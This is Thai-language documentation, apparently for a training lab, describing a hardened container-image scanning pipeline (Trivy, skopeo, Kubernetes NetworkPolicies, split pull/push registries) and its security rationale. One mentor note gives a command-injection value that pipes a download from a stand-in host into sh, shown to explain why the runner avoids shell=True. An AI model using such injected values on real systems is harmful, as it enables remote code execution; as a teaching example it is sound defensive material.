---

## 6. Scanner image (`scan-runner/`)

เวอร์ชันปัจจุบัน **1.1.0** (`sha256:8565ed4af32ff004e982d3f840211fbea124a85a7bbd99942e23c8003981b2ea`)
1.1.0 ต่างจาก 1.0.0 ตรงที่ `publish` login ก่อน push

### 6.1 ข้างใน image (`Dockerfile`)
- **2 stage:** ดึงแค่ binary `trivy` จาก `ghcr.io/aquasecurity/trivy:0.76.1@sha256:...` มาวางบน `alpine:3.24@sha256:...` ทั้งสองตัว pin ด้วย digest ค่าจริงส่งมาจาก Ansible
- ติดตั้ง `python3`, `skopeo`, `ca-certificates` แล้ว
  - สร้าง user `scanner` (10001:10001) ไม่มี shell (`/sbin/nologin`) ไม่มี home
  - ถอดบิต setuid/setgid ทุกไฟล์ และลบ `apk` ทิ้ง ใน container จึงติดตั้งอะไรเพิ่มหรือยกสิทธิ์ไม่ได้
- `trivy`, `runner.py` (0555) และ `policy.json` (0444) เป็นของ root user 10001 แก้ไม่ได้
- `HOME`, `TMPDIR`, `TRIVY_CACHE_DIR` อยู่ใต้ `/work` ทั้งหมด rootfs จึงตั้ง read-only ได้
- `ENTRYPOINT ["python3", "-I", "/opt/vlab-scan/runner.py"]` (`-I` = isolated mode ไม่อ่าน env `PYTHON*` และ user site-packages) ค่าเริ่มต้น `CMD ["version"]`
- ไม่มีบรรทัด `# syntax=` เพราะจะดึง frontend image เพิ่มอีกตัวที่ไม่ได้ pin

`policy.json` ของ skopeo: `default: reject` ยอมรับเฉพาะ transport `docker-archive` และ `oci-archive` (ไฟล์ในเครื่อง) ต่อให้ argument ถูกปลอม skopeo ก็ไม่ดึง image จาก registry ภายนอก

> **💡 Mentor:** ทำไมต้อง pin ด้วย digest ไม่ใช่ tag? tag เปลี่ยนเนื้อหาได้ (คนที่คุม registry ต้นทาง push ทับได้)
> แต่ digest คือ hash ของเนื้อหา เปลี่ยนไม่ได้ Trivy เองเคยมีเวอร์ชัน 0.69.4-0.69.6 ที่ถูกวางโค้ดร้าย
> (role จึงบล็อกไว้) การ pin digest + ตรวจลายเซ็น cosign คือการป้องกัน **supply chain attack**

#### โครงไฟล์ใน image
| path | เจ้าของ / สิทธิ์ | คืออะไร |
|---|---|---|
| `/opt/vlab-scan/runner.py` | root, 0555 | logic ทั้งหมด (คอมไพล์ตรวจ syntax ตอน build แล้วลบ `__pycache__`) |
| `/usr/local/bin/trivy` | root, 0555 | binary ที่ copy มาจาก image ทางการของ Trivy |
| `/etc/vlab-scan/policy.json` | root, 0444 | trust policy ของ skopeo |
| `/usr/bin/skopeo`, `/usr/bin/python3` | root (จาก apk) | tool ที่ runner เรียก |
| `/work` | 10001, เขียนได้ | ใน Pod ถูกทับด้วย `emptyDir` เป็นที่เดียวที่เขียนได้ |
| `/secrets/fetch/download_url` | mount ตอนรัน, 0400 | มีเฉพาะใน `fetch` |
| `/secrets/push/{username,password}` | mount ตอนรัน, 0400 | มีเฉพาะใน `publish` |

#### ลำดับการ build ใน `Dockerfile`
1. `FROM ${TRIVY_IMAGE} AS trivy` ดึง image ของ Trivy เป็น stage ชั่วคราว (ใช้แค่ binary)
2. `FROM ${BASE_IMAGE}` เริ่ม image จริงจาก Alpine ที่ pin digest
3. `RUN apk add ... && addgroup/adduser ... && find / -perm /6000 -exec chmod a-s ... && rm -rf /sbin/apk ...` ทุกอย่างอยู่ใน `RUN` เดียว layer สุดท้ายจึงไม่มี apk หลงเหลือ
4. `COPY --from=trivy`, `COPY policy.json`, `COPY runner.py`
5. `RUN chown root ... chmod 0555/0444 ... python3 -I -m py_compile` ล็อกสิทธิ์และตรวจว่า `runner.py` ไม่มี syntax error (มี = build ล้ม)
6. ตั้ง `ENV`, `USER 10001:10001`, `WORKDIR /work`, `ENTRYPOINT`, `CMD`

> **💡 Mentor:** ข้อ 3 รวมทุกอย่างไว้ใน `RUN` เดียวเพราะแต่ละ `RUN` คือ layer หนึ่ง ถ้าแยก `rm -rf /sbin/apk` เป็นอีก `RUN`
> apk จะยังอยู่ใน layer ก่อนหน้า ใครดึง image ไปแตก layer ก็ยังเจอ การลบใน layer ถัดไปแค่ซ่อน ไม่ได้ลบจริง

ค่า `ARG` (`TRIVY_IMAGE`, `BASE_IMAGE`, `RUNNER_VERSION`, `TRIVY_VERSION`) มีค่าเริ่มต้นใน Dockerfile แต่ role `scan-runner-image` ส่งค่าทับทุกครั้ง **ถ้าขึ้นเวอร์ชันต้องแก้ให้ตรงกัน 4 ที่**: `RUNNER_VERSION` ใน `runner.py`, `ARG RUNNER_VERSION` ใน `Dockerfile`, `scan_runner_version` ใน role, `SCAN_RUNNER_VERSION` ใน `settings.py`

### 6.2 กลไกร่วมของ `runner.py`
- **Python stdlib อย่างเดียว** ไม่มี supply chain ของ pip
- **state ข้ามขั้น:** ทุกขั้นอ่าน/เขียน `/work/state.json` (`load_state` / `save_state`) โดยเขียนไฟล์ชั่วคราว + `fsync` แล้ว `os.replace` (atomic) container ถูกฆ่ากลางทางก็ไม่ได้ไฟล์ครึ่งๆ
- **`run_step(name, body)`:** ถ้า state มี verdict แล้ว ข้ามขั้นตัวเอง ถ้า body โยน `Verdict` จะบันทึก verdict + เหตุผลลง state แล้ว **exit 0** เพื่อให้ `publish` ได้เขียนผลเสมอ
- **`Verdict(verdict, reason, retryable)`** แทนผลที่รายงานได้ ใช้ผ่าน `fail(reason)` (FAIL) และ `error(reason, retryable)` (ERROR)
- **exit non-zero เฉพาะเมื่อ runner พังเอง** (exception ไม่คาดคิด, เขียน termination log ไม่ได้) → Job `Failed` → reconciler retry
- **`run_tool(argv, timeout)`:** เรียก tool ด้วย argv list (ไม่ผ่าน shell), stdin ปิด, env มีแค่ `PATH`, `HOME`, `TMPDIR`, `LANG`
- **ตรวจรูปแบบ input ทุกตัวก่อนใช้** ด้วย regex (`RE_UUID`, `RE_ETAG`, `RE_REGISTRY`, `RE_REPOSITORY`, `RE_TAG`, `RE_DIGEST`, `RE_ARCH`, `RE_USERNAME`) ค่าผิดรูปแบบได้ `ERROR` ไม่ retry
- ข้อความทุกอันผ่าน `clip()` (ตัดความยาว ลบขึ้นบรรทัดใหม่) และไม่เคย log URL, environment หรือรหัส
- `main` ตั้ง `umask 0077` ไฟล์ที่สร้างใน `/work` อ่านได้แค่เจ้าของ

> **💡 Mentor:** "ไม่ผ่าน shell" สำคัญมาก ถ้าเขียน `subprocess.run(f"skopeo copy ... docker://{repo}", shell=True)`
> แล้ว `repo` มีค่าเป็น `x; curl evil.sh | sh` ก็จะเป็น command injection ทันที การส่ง argv เป็น list
> ทำให้แต่ละค่าเป็นแค่ argument เสมอ ไม่ว่าจะมีอักขระอะไรอยู่ข้างใน

#### ตาราง function ของ `runner.py`
| กลุ่ม | ชื่อ | ทำอะไร |
|---|---|---|
| entry | `main(argv)` | ตรวจว่ามีคำสั่งย่อยเดียวและอยู่ใน `COMMANDS` (ไม่งั้น exit 2), ตั้ง umask, สร้าง `TMPDIR` แล้วเรียกคำสั่ง |
| entry | `COMMANDS` | map `fetch` / `validate` / `scan` → `run_step(...)`, `publish` → `cmd_publish`, `version` → `cmd_version` |
| ผล | `Verdict` | exception ที่ถือ `verdict`, `reason`, `retryable` |
| ผล | `fail(reason)` | โยน `Verdict("FAIL")` (image ไม่ผ่าน, ไม่ retry) |
| ผล | `error(reason, retryable)` | โยน `Verdict("ERROR")` (ตรวจไม่สำเร็จ) |
| ช่วย | `log(message)` | เขียน `[vlab-scan] ...` ลง stderr (เห็นใน `kubectl logs`) |
| ช่วย | `clip(value, limit)` | ตัดข้อความให้สั้น (ค่าเริ่ม 200 ตัว) และลบขึ้นบรรทัดใหม่ |
| config | `env(name, default)` | อ่าน env ที่ต้องมี ว่าง = `ERROR` ไม่ retry |
| config | `env_bool`, `env_int` | อ่านค่า bool / int พร้อมค่าเริ่มต้นและขั้นต่ำ |
| config | `checked(name, pattern)` | อ่าน env แล้วตรวจกับ regex |
| config | `image_id()`, `expected_etag()` | อ่าน `IMAGE_ID` / `ETAG` แบบไม่โยน error (ใช้ใส่ในผลแม้ค่าผิด) |
| state | `load_state()` | อ่าน `state.json` ไม่มีไฟล์ = state เปล่า, ไม่ใช่ dict = runner พัง |
| state | `save_state(state)` | เขียนแบบ atomic |
| state | `run_step(name, body)` | โครงของ 3 ขั้นแรก (ข้ามถ้ามี verdict, จับ `Verdict`, บันทึกผล) |
| tool | `run_tool(argv, timeout, env_extra)` | `subprocess.run` แบบปลอดภัย |
| tool | `tool_error(result)` | ดึงบรรทัดสุดท้ายของ stderr มาเป็นเหตุผล |
| fetch | `_HttpsOnlyRedirect` | handler ที่ปฏิเสธ redirect ที่ไม่ใช่ https |
| fetch | `_download_once(url, size, timeout)` | โหลดหนึ่งครั้ง คืน (ขนาด, md5, sha256) |
| fetch | `step_fetch(state)` | ขั้น fetch ทั้งหมด (รวม retry 3 ครั้ง) |
| validate | `detect_archive_format()` | อ่าน header ของ tar คืน `docker-archive` / `oci-archive` |
| validate | `step_validate(state)` | ขั้น validate ทั้งหมด |
| scan | `evaluate_report(report, sev, ignore_unfixed)` | ตัดสิน policy จาก report (ฟังก์ชันล้วน) |
| scan | `trivy_version()` | อ่านเวอร์ชันจาก `trivy --version --format json` |
| scan | `step_scan(state)` | รัน Trivy แล้วเรียก `evaluate_report` |
| publish | `read_push_credentials()` | อ่าน `/secrets/push/{username,password}` ไม่มี / ผิดรูปแบบ = `ERROR` ไม่ retry |
| publish | `write_authfile(registry, user, password)` | เขียน authfile ของ skopeo (รูปแบบ `~/.docker/config.json`) สิทธิ์ 0600 ใน `TMPDIR` |
| publish | `step_push(state)` | `skopeo copy --dest-authfile ...` เข้า registry ลบ authfile ใน `finally` แล้วอ่าน digest |
| publish | `build_result(state)` | สร้าง dict ผลสุดท้าย |
| publish | `encode_result(result)` | แปลงเป็น JSON และตัดจนไม่เกิน 3,500 ไบต์ |
| publish | `cmd_publish()` | push (ถ้ายังไม่มี verdict) แล้วเขียน termination log |
| อื่นๆ | `cmd_version()` | พิมพ์เวอร์ชันของเครื่องมือ |

#### env ที่ runner อ่าน
| env | ขั้นที่ใช้ | ค่าเริ่มต้น | ผิดรูปแบบ / ไม่มี |
|---|---|---|---|
| `IMAGE_ID` | ใส่ในผล | (ว่างได้) | ใส่เป็นค่าว่างในผล |
| `ETAG` | fetch, ใส่ในผล | ต้องมี | fetch → `ERROR` ไม่ retry |
| `EXPECTED_SIZE` | fetch | ต้องมี (≥1) | `ERROR` ไม่ retry |
| `MAX_ARCHIVE_BYTES` | fetch | 20 GiB | |
| `FETCH_TIMEOUT_SECONDS` | fetch | 60 (≥5) | timeout ต่อการอ่านหนึ่งครั้ง ไม่ใช่ทั้งไฟล์ |
| `ALLOWED_ARCH` | validate | `amd64` | `ERROR` ไม่ retry |
| `DECLARED_PORTS` | validate | ว่าง | ใช้แค่ทำ warning |
| `POLICY_FAIL_SEVERITY` | scan | `CRITICAL` | ไม่ใช่ LOW/MEDIUM/HIGH/CRITICAL → `ERROR` |
| `POLICY_IGNORE_UNFIXED` | scan | `true` | |
| `TRIVY_TIMEOUT_MINUTES` | scan | 20 | |
| `REGISTRY`, `REPOSITORY`, `TAG` | publish | ต้องมี | `ERROR` ไม่ retry |
| `REGISTRY_TLS_VERIFY` | publish | `false` | |
| `WORK_DIR`, `DOWNLOAD_URL_FILE`, `PUSH_CREDENTIALS_DIR`, `TERMINATION_LOG`, `SKOPEO_POLICY` | ทุกขั้น | ตาม path ในตารางโครงไฟล์ | ใช้แก้ path ตอนทดสอบนอก Pod |

#### ไฟล์ใน `/work` ระหว่างทาง
| ไฟล์ | สร้างโดย | ใช้โดย |
|---|---|---|
| `image.tar` | fetch | validate, scan, publish |
| `state.json` | ทุกขั้น | ทุกขั้น |
| `tmp/` | `main` | Trivy, skopeo (ผ่าน `TMPDIR`) |
| `tmp/.auth-*.json` | publish (มีอยู่แค่ช่วง push) | skopeo |
| `trivy-cache/` | scan (Trivy โหลด DB) | scan |
| `trivy.json` | scan | scan (อ่านกลับมาตัดสิน) |
| `digest` | publish (skopeo `--digestfile`) | publish |

`/work` เป็น `emptyDir` ของ Pod นั้น Job จบแล้วหายทั้งหมด ไม่มีอะไรแชร์ข้าม Pod

#### ตัวอย่าง `state.json` หลังผ่านครบทุกขั้น
```json
{
  "steps": {
    "fetch":    {"ok": true, "bytes": 3808256, "sha256": "8087a2d2...bbc5"},
    "validate": {"ok": true, "image": {"os": "linux", "architecture": "amd64", "user": "", "exposedPorts": []}},
    "scan":     {"ok": true, "trivyVersion": "0.76.1", "failSeverity": "CRITICAL",
                 "counts": {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "UNKNOWN": 0},
                 "secrets": 0, "top": []},
    "publish":  {"ok": true, "digest": "sha256:5b5427e6...b800"}
  },
  "verdict": "PASS",
  "reasons": [],
  "warnings": ["image runs as root"],
  "transport": "docker-archive",
  "digest": "sha256:5b5427e6...b800"
}
```
ถ้าขั้นไหนได้ verdict ระหว่างทาง ขั้นนั้นจะเป็น `{"ok": false}` มี `verdict`, `retryable`, `reasons` และขั้นที่เหลือไม่ถูกบันทึก (ข้ามตัวเอง)

### 6.3 ลำดับใน Pod
```
fetch (init) ─► validate (init) ─► scan (init) ─► publish (main) ─► /dev/termination-log
      └──────────────── /work: image.tar, state.json, trivy.json, digest ────────────────┘
```

#### `fetch` (`step_fetch`)
1. ตรวจ `ETAG` (md5 32 ตัว หรือรูปแบบ multipart `xxx-N`) และ `EXPECTED_SIZE`
2. ขนาดเกิน `MAX_ARCHIVE_BYTES` (20 GiB) → `FAIL`
3. อ่าน URL จาก `/secrets/fetch/download_url` ต้องขึ้นต้น `https://` (ไม่มีไฟล์ → `ERROR` retryable)
4. `_download_once` โหลดด้วย `urllib`: ไม่ใช้ proxy จาก env (`ProxyHandler({})`), redirect ได้เฉพาะไป https (`_HttpsOnlyRedirect` กันถูกเบนไป http หรือ `file://`), `Content-Length` ไม่ตรงหยุดทันที, เกิน `EXPECTED_SIZE` หยุดทันที (กันดิสก์เต็ม), คำนวณ md5 + sha256 ไปพร้อมกันแล้ว `fsync`
5. ตรวจหลังโหลด: ขนาดต้องตรง และ md5 ต้องเท่ากับ ETag (multipart ตรวจได้แค่ขนาด) ข้อนี้รับประกันว่า **ไฟล์ที่สแกนคือไฟล์ที่ webhook บันทึกไว้**
6. ลองได้ 3 ครั้ง (หน่วง 2, 4 วินาที) ยกเว้น HTTP 401/403/404 ที่หยุดลองทันที
7. ล้มทั้งหมด → ลบไฟล์ครึ่งๆ → `ERROR retryable` (ข้อความมีแค่ `HTTP <code>` ไม่มี URL)
8. สำเร็จ บันทึก `bytes` และ `sha256` (ไปโผล่ใน summary เป็น `archiveSha256`)

#### `validate` (`step_validate`)
1. `detect_archive_format()` อ่าน header ของ tar **โดยไม่แตกไฟล์**
   - ปฏิเสธ (`FAIL`) ถ้า: entry เกิน 200,000, path ขึ้นต้น `/` หรือมี `..`, มีไฟล์ device, ไม่ใช่ tar ไม่บีบอัด (ต้องมาจาก `docker save`), tar เสีย
   - มี `manifest.json` → `docker-archive`, มี `index.json` + `oci-layout` → `oci-archive`, ไม่เข้าทั้งสองแบบ → `FAIL`
2. `skopeo inspect --config <transport>:/work/image.tar` อ่านไม่ได้ (tar เสีย, หลาย image ใน tar เดียว, manifest ผิด) → `FAIL`
3. ต้องเป็น `linux/<ALLOWED_ARCH>` (amd64) ไม่งั้น `FAIL`
4. warning (ไม่ทำให้ไม่ผ่าน): image รันเป็น root, port ใน `DECLARED_PORTS` ไม่ได้ `EXPOSE` ครบ
5. บันทึก transport ลง state ให้ `publish` ใช้ และบันทึก os / arch / user / exposed ports ลง summary

#### `scan` (`step_scan`)
1. อ่าน `POLICY_FAIL_SEVERITY` (ห้ามเป็น `UNKNOWN`), `POLICY_IGNORE_UNFIXED`, `TRIVY_TIMEOUT_MINUTES` (20)
2. ขอ severity ตั้งแต่ HIGH ขึ้นไป (หรือต่ำกว่าถ้า threshold ต่ำกว่า) เพื่อเก็บ warning ได้ด้วย
3. รัน
   ```
   trivy image --input /work/image.tar --scanners vuln,secret --image-config-scanners secret
               --severity <...> --format json --output /work/trivy.json --exit-code 0
               --timeout 20m --cache-dir /work/trivy-cache
               --no-progress --skip-version-check --disable-telemetry --quiet
   ```
   - `--exit-code 0` เสมอ ให้ Python ตัดสินเอง
   - `--image-config-scanners secret` หา secret ใน `ENV` และ history ของ image ด้วย ไม่ใช่แค่ในไฟล์
   - ไม่ใช้ `--ignore-unfixed` ของ Trivy กรองเองจาก `FixedVersion`
   - DB โหลดใหม่ทุก Job ลง `/work` ไม่แชร์ cache ข้าม Pod
4. Trivy ล้ม (ส่วนใหญ่คือโหลด DB ไม่ได้) หรือ report อ่านไม่ได้ → `ERROR retryable`
5. `evaluate_report(report, fail_severity, ignore_unfixed)` (ฟังก์ชันล้วน)
   - ตัดช่องโหว่ซ้ำด้วย (ID, package, version)
   - **blocking:** ระดับ ≥ threshold และมีเวอร์ชันแก้ (หรือ `ignore_unfixed=false`)
   - **warning:** HIGH ขึ้นไปที่ไม่เข้าเกณฑ์ blocking
   - **secret ระดับ HIGH ขึ้นไป** → blocking, ต่ำกว่านั้น → warning
   - คืน `passed`, `reasons`, `warnings`, `counts` ต่อ severity, จำนวน secret, `top` 5 รายการ, `secretTop` 2 รายการ
6. ไม่ผ่าน → เก็บรายละเอียดไว้ใน `state.scanDetail` ก่อน แล้ว `FAIL`

> **💡 Mentor:** `evaluate_report` ถูกแยกออกมาเป็นฟังก์ชันล้วน (รับ dict คืน dict ไม่แตะไฟล์ / เครือข่าย) ก็เพื่อให้ test ง่าย
> นี่คือหลัก "functional core, imperative shell" เก็บ logic ที่ต้องตัดสินใจไว้ตรงกลางที่ test ได้ แล้วให้ขอบนอกเป็นคนแตะ I/O

| เจออะไร | ผล |
|---|---|
| ช่องโหว่ CRITICAL ที่มีเวอร์ชันแก้ | FAIL |
| ช่องโหว่ CRITICAL ที่ยังไม่มีเวอร์ชันแก้ | warning |
| secret HIGH/CRITICAL (private key, cloud token) | FAIL |
| ช่องโหว่ HIGH, secret ระดับต่ำ, รันเป็น root, port ไม่ตรง | warning |

#### `publish` (`cmd_publish` + `step_push`)
1. ถ้ายังไม่มี verdict (ทุกขั้นผ่าน) → `step_push`
   1. ตรวจ `REGISTRY`, `REPOSITORY`, `TAG` และ transport ที่ `validate` บันทึกไว้
   2. `read_push_credentials()` อ่าน username / password จาก `/secrets/push` (ตัด `\n` ท้าย) ไม่มีไฟล์, username ไม่ตรง `^[a-z0-9_-]{1,64}$`, password ว่างหรือมีขึ้นบรรทัด → `ERROR` **ไม่ retry** เพราะเป็นปัญหาการตั้งค่า retry กี่รอบก็ไม่หาย
   3. `write_authfile()` สร้าง `{"auths": {"<registry>": {"auth": base64(user:pass)}}}` ด้วย `mkstemp` (0600 อยู่แล้ว) ใน `/work/tmp`
   4. `skopeo --policy ... copy --retry-times 3 --dest-tls-verify=false --dest-authfile <authfile> --digestfile /work/digest <transport>:/work/image.tar docker://REGISTRY/REPOSITORY:TAG`
   5. **ลบ authfile ใน `finally`** ไม่ว่า push จะสำเร็จ ล้ม หรือ timeout
   6. digest ต้องเป็น `sha256:<64 hex>` push ไม่ได้, ไม่มี digest, digest ผิดรูปแบบ → `ERROR retryable`, สำเร็จ → `PASS`
   7. push ทับ tag เดิมได้ เพราะ `(repository, tag)` ใน DB เป็น unique tag นี้จึงเป็นของแถวนี้แถวเดียว
2. `build_result(state)` รวมผล: `imageId`, `etag`, `verdict`, `retryable` (เฉพาะ ERROR), `reasons` (≤5), `warnings` (≤8), `digest` (เฉพาะ PASS), `summary` (เวอร์ชัน runner/Trivy, severity, counts, top findings, image info, `archiveSha256`)
3. `encode_result` ตัดส่วนที่ไม่จำเป็นทีละชั้นจนไม่เกิน 3,500 ไบต์ (K8s ตัดที่ 4,096)
   ลำดับการตัด: `secretTop` → ลด `top` เหลือ 2 → ลบ `top` → ย่อ warnings → ย่อ reasons → ลบ `image`
   ส่วนที่ reconciler ต้องใช้ (`etag`, `verdict`, `digest`) ไม่ถูกตัด
4. เขียน JSON ลง `/dev/termination-log` ถ้าเขียนไม่ได้ runner พัง (exit non-zero) → reconciler retry

> **💡 Mentor:** ทำไมใช้ authfile แทน `--dest-creds user:pass` ที่สั้นกว่า? เพราะ `--dest-creds` อยู่ใน argv
> ซึ่งอ่านได้จาก `/proc/<pid>/cmdline` ตลอดเวลาที่ skopeo รัน (ซึ่งอาจนานหลายนาทีสำหรับ image ใหญ่)
> authfile 0600 อ่านได้แค่ user 10001 และถูกลบทันทีที่ push จบ ต่างกันไม่กี่บรรทัด แต่ปิดช่องรั่วไปได้ทั้งช่อง

#### ตัวอย่างผลที่ `publish` เขียนลง termination log
PASS (จาก `vlab/print-test2077:latest` ที่ทดสอบจริง):
```json
{"imageId":"b81aa248-7937-...","etag":"d313c7e5c05841c025b76c1f6394a2dc","verdict":"PASS","retryable":false,
 "reasons":[],"warnings":["image runs as root"],"digest":"sha256:5b5427e6...b800",
 "summary":{"runnerVersion":"1.1.0","trivyVersion":"0.76.1","failSeverity":"CRITICAL",
            "counts":{"CRITICAL":0,"HIGH":0,"MEDIUM":0,"LOW":0,"UNKNOWN":0},"secrets":0,
            "image":{"os":"linux","architecture":"amd64","user":"","exposedPorts":[]},
            "archiveSha256":"8087a2d2...bbc5"}}
```
ERROR (แถว seed ที่ไม่มีไฟล์บน R2):
```json
{"imageId":"f247a5ca-71cd-...","etag":"d41d8cd98f00b204e9800998ecf8427e","verdict":"ERROR","retryable":true,
 "reasons":["download failed: HTTP 404"],"warnings":[],"digest":null,"summary":{"runnerVersion":"1.1.0"}}
```
`summary` เก็บเฉพาะค่าที่ไม่ว่าง ERROR ตั้งแต่ขั้น fetch จึงเหลือแค่ `runnerVersion`
reconciler ใช้ `etag`, `verdict`, `retryable`, `digest`, `reasons` ตัดสิน ส่วน `summary` (บวก verdict / reasons / warnings) ถูกเก็บลง DB ผ่าน `_summary_from` ให้หน้าเว็บแสดง

#### `version`
พิมพ์เวอร์ชันของ runner, Python, Trivy, skopeo เป็น JSON (role `scan-runner-image` ใช้ smoke test หลัง build)
```json
{"runner": "1.1.0", "python": "3.12.x", "trivy": "0.76.1", "skopeo": "1.x.x"}
```

#### ผลที่เป็นไปได้ของแต่ละขั้น
| ขั้น | เหตุ | verdict | retryable |
|---|---|---|---|
| fetch | `ETAG` / `EXPECTED_SIZE` ไม่มีหรือผิดรูปแบบ | ERROR | ไม่ |
| fetch | ขนาดเกิน `MAX_ARCHIVE_BYTES` | FAIL | |
| fetch | ไม่มีไฟล์ Secret / HTTP error / ขนาดหรือ md5 ไม่ตรง | ERROR | ใช่ |
| fetch | URL ไม่ใช่ https | ERROR | ไม่ |
| validate | tar เสีย / path อันตราย / device / ไม่ใช่ image / หลาย image / ไม่ใช่ amd64 | FAIL | |
| scan | `POLICY_FAIL_SEVERITY` ผิด | ERROR | ไม่ |
| scan | Trivy ล้ม / report อ่านไม่ได้ | ERROR | ใช่ |
| scan | ไม่ผ่าน policy | FAIL | |
| publish | `REGISTRY` / `REPOSITORY` / `TAG` ผิดรูปแบบ | ERROR | ไม่ |
| publish | **credential ไม่มี / ผิดรูปแบบ** | ERROR | ไม่ |
| publish | push ไม่ได้ (รวม `unauthorized`), ไม่มี digest | ERROR | ใช่ |
| ทุกขั้น | exception ที่ไม่คาด, `state.json` เสีย, เขียน termination log ไม่ได้ | (Job Failed) | reconciler retry |

#### ระยะเวลาจริงที่วัดได้ (tar 3.8 MB)
| ช่วง | สถานะ Pod | ใช้เวลา | หมายเหตุ |
|---|---|---|---|
| ครั้งแรกบน node | `Init:0/3` | ~2.5 นาที | pull `vlab/scan-runner` ครั้งแรก รอบต่อไปมีในเครื่องแล้ว |
| fetch + validate | `Init:0/3` → `Init:2/3` | 2-5 วินาที | ไฟล์ใหญ่ขึ้นเวลาขึ้นตามความเร็วโหลดจาก R2 |
| scan | `Init:2/3` | ~1.5-2 นาที | ส่วนใหญ่คือโหลด Trivy DB |
| publish | `Running` | ~6-10 วินาที | push เข้า camp registry |
| ERROR ที่ fetch (404) | ทุกขั้นข้าม | ~5 วินาที | ขั้นหลังเห็น verdict แล้วข้ามตัวเอง |

#### ทดสอบ `validate` / `scan` นอก Pod
mount โฟลเดอร์ที่มี `image.tar` เป็น `/work` (ข้าม `fetch` ซึ่งต้องมี URL จริง) และใส่ข้อจำกัดเดียวกับใน Pod (รันบน rn) ขั้นตอนนี้เขียนตามโค้ด ยังไม่ได้ลองรันจริง:
```bash
mkdir work && cp image.tar work/ && sudo chown -R 10001:10001 work
docker run --rm --read-only --cap-drop=ALL --security-opt=no-new-privileges \
  -v "$PWD/work:/work" localhost:5001/vlab/scan-runner:1.1.0 validate
docker run --rm --read-only --cap-drop=ALL --security-opt=no-new-privileges \
  -v "$PWD/work:/work" localhost:5001/vlab/scan-runner:1.1.0 scan
cat work/state.json
```

---

## 7. Namespace `vlab-scan` (`k8s/scan-namespace.yaml`)

apply โดย role `k3s-server` (tag `scan`) ซึ่งแทน `REGISTRY_IP` ด้วย IP ของ rn จาก inventory

| resource | ค่า | ทำไม |
|---|---|---|
| Namespace + Pod Security `restricted` | K8s บังคับเอง | Pod ที่แตะไฟล์ของผู้ใช้ห้ามขอสิทธิ์เกินปกติ ต่อให้ backend สร้าง manifest ผิดก็ถูกปฏิเสธ |
| `PriorityClass vlab-scan` | -100, `preemptionPolicy: Never` | ต่ำกว่า lab ของนักศึกษาและไม่เบียดใคร |
| `ResourceQuota` | 6 pods, requests 4 CPU / 6Gi, limits 8 CPU / 12Gi | กัน Job สแกนกินเครื่องจนหมด |
| NetworkPolicy `default-deny-ingress` | ขาเข้าปิดทั้งหมด | ไม่มีใครต้องเรียกเข้า Pod สแกน |
| NetworkPolicy `restrict-egress` | DNS (`kube-dns`), **rn `/32` พอร์ต 5001 + 5002**, อินเทอร์เน็ตพอร์ต 443 ยกเว้นช่วงภายในทั้งหมด | Pod แตะ kube API, node อื่น, tailnet และ backend ไม่ได้ |

ช่วงภายในที่ตัดออกจาก 443: `10/8`, `172.16/12`, `192.168/16`, `100.64/10` (Tailscale), `169.254/16` (metadata ของ cloud), `127/8`

> **💡 Mentor:** NetworkPolicy คือ firewall ระดับ Pod ส่วน Tailscale ACL คือ firewall ระดับเครื่อง
> ระบบนี้ใช้ทั้งสองชั้น (defense in depth) NetworkPolicy กัน Pod สแกนเข้าหา backend หรือ kube API
> ส่วน ACL กันเครื่อง worker push เข้า registry ชั้นหนึ่งกันสิ่งที่อีกชั้นมองไม่เห็น

> **🧪 ลองเอง:** บน masterpc
> ```bash
> kubectl -n vlab-scan get networkpolicy restrict-egress -o jsonpath='{.spec.egress[1].ports}'; echo
> ```
> ต้องเห็น 5001 และ 5002 ลองคิดว่าถ้าลืมเพิ่ม 5002 ตรงนี้ อาการจะเป็นยังไง และจะเห็นใน log ของ container ไหน

---

## 8. Camp registry แยก pull / push

### 8.1 ปัญหาที่แก้
เดิม registry มี container เดียวที่พอร์ต 5001 ไม่มี auth และ ACL เปิดให้ worker เข้า 5001 ได้ ใครที่อยู่บนเครื่องแลปหรือในทีมจึง `docker push <registry>:5001/vlab/อะไรก็ได้` ได้ตรงๆ แล้ว `ecr-sync` จะพาขึ้น ECR ให้ด้วย **การสแกนทั้งระบบจึงเป็นด่านที่เดินอ้อมได้**

### 8.2 ดีไซน์ใหม่ (role `registry`)

| | `camp-registry-pull` | `camp-registry-push` |
|---|---|---|
| พอร์ตบน host | 5001 | 5002 |
| auth | ไม่มี | htpasswd (bcrypt cost 12) realm `camp-registry` |
| เขียนได้ไหม | ไม่ได้ (`readonly: enabled` + data mount `:ro`) | ได้ รวมลบ (`delete: enabled`) |
| เก็บกวาด upload ค้าง | ปิด (`uploadpurging: false`) | เปิด (ค่าเริ่มต้น) |
| blob cache ในหน่วยความจำ | ไม่ใช้ (อีกตัวเขียน cache จะค้าง) | ค่าเริ่มต้น |
| ใครใช้ | K3s (worker / master), ecr-sync, SkyPilot | Job สแกน (`scanner`), Ansible (`ansible`) |

ทั้งสองตัวใช้ `/srv/camp-registry` ร่วมกัน image `registry:2.8.3` (pin เวอร์ชัน) config เป็นไฟล์ (`templates/config-pull.yml.j2`, `config-push.yml.j2`) mount ไปที่ `/etc/docker/registry/config.yml`

container hardening: `--read-only --tmpfs /tmp --cap-drop ALL --security-opt no-new-privileges --restart always`

> **💡 Mentor:** ทำไมไม่ใช้ registry ตัวเดียวแล้วเปิด auth ทั้งหมด? เพราะ worker ต้อง pull ได้โดยไม่ต้องมีรหัส
> (ถ้าใส่รหัสใน `registries.yaml` ของทุก worker รหัสจะกระจายไปทุกเครื่องแลป ซึ่งเป็นเครื่องที่นักศึกษานั่งใช้)
> แยกพอร์ตทำให้ **ฝั่งอ่านเปิดได้อย่างปลอดภัย และฝั่งเขียนปิดได้แน่นหนา** โดยไม่ต้องแจกรหัส

### 8.3 ลำดับของ role
1. **ตรวจ input:** มี user อย่างน้อย 1 คนรวม `registry_verify_user` (`ansible`), ชื่อ `a-z0-9_-`, รหัสยาว ≥ 12, พอร์ตไม่ซ้ำกัน
2. ติดตั้ง `docker.io` และ `apache2-utils` (`htpasswd`)
3. สร้าง `/srv/camp-registry`, `/etc/camp-registry` (0750) และ `/etc/camp-registry/auth`
4. เขียน config ทั้งสองไฟล์
5. **htpasswd แบบ idempotent:**
   - ลบ user ที่ไม่อยู่ใน `registry_users` (`htpasswd -D`)
   - ตรวจรหัสของแต่ละ user ด้วย `htpasswd -v -i` (รหัสส่งทาง stdin)
   - เขียนเฉพาะ user ที่ใหม่หรือรหัสเปลี่ยน (`htpasswd -B -C 12 -i`)
